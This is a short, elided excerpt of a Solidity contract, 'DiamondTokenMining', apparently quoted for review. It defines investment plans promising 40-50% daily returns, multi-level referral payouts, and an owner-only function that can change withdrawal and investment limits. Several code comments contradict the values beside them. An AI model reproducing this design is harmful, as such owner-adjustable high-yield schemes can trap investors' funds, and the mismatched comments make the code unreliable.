...
contract DiamondTokenMining {
    ...
    IERC20 public token = IERC20(0xea536C17315B8836195052Dd8dBa4040ECDC7c65); // DIAMOND MAINNET

	uint256 public INVEST_MIN_AMOUNT = 1000000000 ether; // 1000000000 TOKEN
	uint256[] public REFERRAL_PERCENTS = [120, 50, 30]; // 12,5,3
	uint256 constant public DEV_FEE = 0; //0%
    ...
    uint256 constant public WITHDRAW_COOLDOWN = 0; // 4 HOURS
	...
	constructor(address payable wallet) {
        ...
        plans.push(Plan(180, 500)); // 180 days 50% daily // 
        plans.push(Plan(90, 500)); // 90 days 50% daily // 
        plans.push(Plan(60, 450)); // 60 days 40.5% daily // 
        plans.push(Plan(30, 400)); // 30 days 40% daily // 
	}
    ...
    function setting(uint256 min_investment, uint256 Max_withdraw, uint256 w_limit, uint256 ref1, uint256 ref2, uint256 ref3) public owner {
